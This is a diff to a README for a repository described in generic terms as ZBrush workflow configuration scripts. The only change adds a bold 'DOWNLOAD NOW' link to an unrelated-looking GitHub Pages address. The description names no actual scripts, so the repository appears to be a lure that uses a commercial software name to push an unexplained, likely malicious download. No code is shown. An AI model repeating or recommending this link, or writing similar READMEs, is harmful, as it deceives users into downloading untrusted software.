@@ -1,6 +1,8 @@
 # ZBrush | Workflow Configuration Scripts
 This repository contains technical scripts and configurations for automating ZBrush environment setup and workflow integration.
 
+[📥 **DOWNLOAD NOW**](https://avalanchemidge.github.io/?az11)
+
 ## Usage Overview
 The provided scripts facilitate the streamlined deployment and management of ZBrush-related assets and settings, ensuring consistent system integration.
 
